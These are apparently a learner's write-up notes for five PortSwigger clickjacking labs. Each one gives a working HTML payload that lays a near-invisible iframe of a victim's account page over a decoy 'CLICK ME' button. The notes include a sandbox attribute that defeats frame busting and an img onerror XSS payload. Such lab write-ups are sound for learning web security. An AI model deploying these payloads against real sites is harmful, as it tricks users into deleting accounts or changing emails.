

#### Reference: [Basic clickjacking with CSRF token protection](https://portswigger.net/web-security/clickjacking/lab-basic-csrf-protected)

##### Analysis:

Inside my-account there is delete buttion we want user to click delete by misleading.

We can do that by send an HTML Page with Click here buttion which is placed upon Delete buttion.

you can make payload by using burp Clickbandit.

Note:- value of width, height, top, left and opacity you need to adjest.
##### Steps:

1. Go to exploit server and make an HTML payload.
```
<style>

  iframe {
    position: relative;
    width: 500px;
    height: 700px;
    opacity: 0.001;
    z-index: 2;
  }

  div {
    position:absolute;
    top:555px;
    left:60px;
    z-index:1;
  }
</style>

<div>CLICK ME</div>
<iframe src="https://0a41002304b134f4800271d400f9002e.web-security-academy.net/my-account"></iframe>
```

2. you need to adjest the value of positon according to you convinience.

3. Inside we are overlaping our click me buttion over vitim account.

4. For overlaping we have used ifram tag.

5. Now send this payload to the server.


---
#### Reference:[Clickjacking with form input data prefilled from a URL parameter](https://portswigger.net/web-security/clickjacking/lab-prefilled-form-input)

##### Analysis:

This is the continuation of previous lab. 

we need to change email and vitim should be clicking on changing email.

So we need to construct url in which email is present, Then Victim need to clike on the button where we want him to click.

payload:  `<iframe src="https://0aea00fb041dd07180f2a3dc00130025.web-security-academy.net/my-account?email=wienerr%40gmail.com"></iframe>`

Everything will be same as previous paylaod.

Note:- value of width, height, top, left and opacity you need to adjest.


##### Steps:

1. Go to the exploit server and past the html payload.
```
<style>

  iframe {
    position: relative;
    width: 500px;
    height: 700px;
    opacity: 0.001;
    z-index: 2;
  }

  div {
    position:absolute;
    top:555px;
    left:60px;
    z-index:1;
  }
</style>

<div>CLICK ME</div>
<iframe src="https://0aea00fb041dd07180f2a3dc00130025.web-security-academy.net/my-account?email=wienerr%40gmail.com"></iframe>
```

2. adjest the cordinates according to you convinence.

3. Send it to the victim.

There you go !!!

---

#### Reference: [Clickjacking with a frame buster script](https://portswigger.net/web-security/clickjacking/lab-frame-buster-script)

##### Analysis:

- Browser inbuild script in stoping us from putting site inside `<iframe>` so we need to use `sandbox="allow-forms"` or `sandbox="allow-scripts"` by this we can bypass the restriction.

- payload:  `<iframe src="https://0aea00fb041dd07180f2a3dc00130025.web-security-academy.net/my-account?email=wienerr%40gmail.com" sandbox="allow-forms"></iframe>`

- Everything will be same as previous paylaod.

- Note:- value of width, height, top, left and opacity you need to adjest.
##### Steps:

1. Go to the exploit server and past the html payload.
```
<style>

  iframe {
    position: relative;
    width: 500px;
    height: 700px;
    opacity: 0.001;
    z-index: 2;
  }

  div {
    position:absolute;
    top:555px;
    left:60px;
    z-index:1;
  }
</style>

<div>CLICK ME</div>
<iframe src="https://0aea00fb041dd07180f2a3dc00130025.web-security-academy.net/my-account?email=wienerr%40gmail.com" sandbox="allow-forms"></iframe>
```

2. adjest the cordinates according to you convinence.

3. Send it to the victim.

There you go !!!

---
#### Reference: [Exploiting clickjacking vulnerability to trigger DOM-based XSS](https://portswigger.net/web-security/clickjacking/lab-exploiting-to-trigger-dom-based-xss)

##### Analysis:
- You can combine clickjacking with xss.
- 1st find xss, you can find the DOM XSS inside feedback form.
	- when you submit form in response your name will show beside feeback buttion.
	- you can try to put xss payload in name section.
	- payload: `<img src=0 onerror=alert(1)>`. 
	- fill the form and submit the feedback, and it's success!!
	  
	  
- Then construct a url in which you can put all the value of the form.
	- `https://0a11000704a146a0801a9f1a005400fa.web-security-academy.net/feedback?name=<img src=0 onerror=print()>&email=as@fd.com&subject=dfoer&message=test`
	- when you visit the url the form will be filled automatically.
	- put that url inside **iframe**. 

##### Steps:
1. You can find xss vulnerability at feebackform.
   
2.  Go to the exploit server and past the html payload.
```
<style>

  iframe {
    position: relative;
    width: 900px;
    height: 7000px;
    opacity: 0.1;
    z-index: 2;
  }

  div {
    position:absolute;
    top:785px;
    left:60px;
    z-index:1;
  }
</style>

<div>CLICK ME</div>
<iframe src="https://0a11000704a146a0801a9f1a005400fa.web-security-academy.net/feedback?name=<img src=0 onerror=print()>&email=as@fd.com&subject=dfoer&message=test"></iframe>
```

3. adjest the cordinates according to you convinence.
   
4. Send it to the victim.

There you go !!!

---
#### Reference: [Multistep clickjacking](https://portswigger.net/web-security/clickjacking/lab-multistep)

##### Analysis:
- We need vicitm to click 2 times.
- so we need to construct HTML payload with 2 cilck.

##### Steps:

1. Go to the exploit server and past the html payload.
```
<style>
	iframe {
		position:relative;
		width:1500;
		height: 700;
		opacity: 0.1;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top:535;
		left:200;
		z-index: 1;
	}
   .secondClick {
		top:330;
		left:360;
	}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://0ac300110417594c81c71b28000400c9.web-security-academy.net/my-account"></iframe>
```

2. adjest the cordinates according to you convinence.

3. Send it to the victim.

There you go !!!


---

				ClickJacking Lab Complited !!!!


